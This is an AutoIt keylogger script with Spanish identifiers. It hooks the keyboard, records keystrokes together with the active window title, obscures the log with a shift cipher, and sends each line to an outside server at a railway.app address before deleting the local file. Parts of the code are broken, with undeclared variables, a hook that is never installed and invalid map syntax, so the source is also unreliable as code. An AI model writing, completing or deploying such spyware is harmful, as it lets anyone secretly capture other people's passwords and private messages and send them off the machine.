#include <WinAPI.au3>
#include <WindowsConstants.au3>
#include <InetConstants.au3>
#include <MsgBoxConstants.au3>
#include <Array.au3>

Opt('MustDeclareVars', 1)

Global $file_name = @ComputerName & "_log.txt"
Global $url = "https://kl.up.railway.app/?kl="
Global $last_send = 0
Global $buffer = ""

TrayItemSetOnEvent(-1, "Salir")

While 1
    _Main()
WEnd

Func Salir()
    WriteAndSendFile()
    MsgBox($MB_ICONINFORMATION, "Mensaje", "Se ha hecho clic en Salir")
    Exit
EndFunc

Func _Main()
    Local $startTime = TimerInit()
    Local $lastActiveWindow = "", $lastActiveTime = 0

    While 1
        Sleep(10)
        If TimerDiff($lastActiveTime) > 10000 Then
            WriteAndSendFile()
            $lastActiveTime = TimerInit()
        EndIf
    WEnd
EndFunc

Func WriteAndSendFile()
    If $buffer <> "" Then
        Local $file = FileOpen($file_name, $FO_APPEND)
        $buffer = CifrarDesplazamiento($buffer, 3)
        FileWrite($file, BinaryToString(Binary($buffer)) & @CRLF)
        FileClose($file)
        $buffer = ""
        SendFileToServer()
    EndIf
EndFunc

Func SendFileToServer()
    If TimerDiff($last_send) > 600000 Or $forced_action Then
        If FileExists($file_name) Then
            Local $aArray = FileReadToArray($file_name)
            For $i = 0 To UBound($aArray) - 1
                InetRead($url & $aArray[$i], $INET_FORCERELOAD)
            Next
            FileDelete($file_name)
        EndIf
        $last_send = TimerInit()
    EndIf
EndFunc

Func EvaluateKey($keycode)
    Local $currentActiveWindow = WinGetTitle("")
    Local $aTitles = ["Title1", "Title2", "Title3"] ; Agrega los títulos aquí
    If StringInStr($currentActiveWindow, $aTitles) Then
        If $title_1 <> $currentActiveWindow Then
            $title_1 = $currentActiveWindow
            $buffer &= @CRLF & @CRLF & "====Title:" & $title_1 & "====Time:" & @YEAR & "." & @MON & "." & @MDAY & "--" & @HOUR & ":" & @MIN & ":" & @SEC & @CRLF
        EndIf
        $buffer &= key($keycode)
    EndIf
EndFunc

Func Key($keycode)
    Local $keyMap = [
        "8" => "[backspace]",
        "9" => "[TAB]",
        "13" => "[ENTER]",
        "19" => "[PAUSE]",
        "20" => "[CAPSLOCK]",
        "27" => "[ESC]",
        "32" => "[SPACE]",
        "33" => "[PAGEUP]",
        "34" => "[PAGEDOWN]",
        "35" => "[END]",
        "36" => "[HOME]",
        "37" => "[←]",
        "38" => "[↑]",
        "39" => "[→]",
        "40" => "[↓]",
        "42" => "[PRINT]",
        "44" => "[PRINT SCREEN]",
        "45" => "[INS]",
        "46" => "[DEL]",
        "48" => "0",
        "49" => "1",
        "50" => "2",
        "51" => "3",
        "52" => "4",
        "53" => "5",
        "54" => "6",
        "55" => "7",
        "56" => "8",
        "57" => "9",
        "65" => "a",
        "66" => "b",
        "67" => "c",
        "68" => "d",
        "69" => "e",
        "70" => "f",
        "71" => "g",
        "72" => "h",
        "73" => "i",
        "74" => "j",
        "75" => "k",
        "76" => "l",
        "77" => "m",
        "78" => "n",
        "79" => "o",
        "80" => "p",
        "81" => "q",
        "82" => "r",
        "83" => "s",
        "84" => "t",
        "85" => "u",
        "86" => "v",
        "87" => "w",
        "88" => "x",
        "89" => "y",
        "90" => "z",
        "91" => "[Windows]",
        "92" => "[Windows]",
        "106" => "*",
        "107" => "+",
        "109" => "-",
        "189" => "-",
        "110" => ".",
        "190" => ".",
        "111" => "/",
        "191" => "/",
        "112" => "[F1]",
        "113" => "[F2]",
        "114" => "[F3]",
        "115" => "[F4]",
        "116" => "[F5]",
        "117" => "[F6]",
        "118" => "[F7]",
        "119" => "[F8]",
        "120" => "[F9]",
        "121" => "[F10]",
        "122" => "[F11]",
        "123" => "[F12]",
        "124" => "[F13]",
        "125" => "[F14]",
        "126" => "[F15]",
        "127" => "[F16]",
        "144" => "[NUMLOCK]",
        "145" => "[SCROLLLOCK]",
        "160" => "[Shift]",
        "161" => "[Shift]",
        "162" => "[Ctrl]",
        "163" => "[Ctrl]",
        "164" => "[Alt]",
        "186" => ";",
        "187" => "=",
        "188" => ",",
        "192" => "`",
        "219" => "[",
        "220" => "",
        "221" => "]"
    ]
    Return $keyMap[$keycode] ?? Chr($keycode)
EndFunc

Func _KeyProc($nCode, $wParam, $lParam)
    Local $tKEYHOOKS = DllStructCreate($tagKBDLLHOOKSTRUCT, $lParam)
    If $nCode < 0 Then Return _WinAPI_CallNextHookEx($hHook, $nCode, $wParam, $lParam)
    If $wParam = $WM_KEYDOWN Or BitAND(DllStructGetData($tKEYHOOKS, "flags"), $LLKHF_ALTDOWN) Then
        EvaluateKey(DllStructGetData($tKEYHOOKS, "vkCode"))
    EndIf
    Return _WinAPI_CallNextHookEx($hHook, $nCode, $wParam, $lParam)
EndFunc

Func DescifrarDesplazamiento($mensajeCifrado, $desplazamiento)
    Return CifrarDesplazamiento($mensajeCifrado, 997997 - $desplazamiento)
EndFunc

Func CifrarDesplazamiento($mensaje, $desplazamiento)
    Local $resultado = ""
    For $i = 1 To StringLen($mensaje)
        Local $caracter = StringMid($mensaje, $i, 1)
        Local $asciiValue = AscW($caracter)
        If $asciiValue >= 32 Then
            $caracter = ChrW(Mod($asciiValue - 32 + $desplazamiento, 997997) + 32)
        EndIf
        $resultado &= $caracter
    Next
    Return $resultado
EndFunc
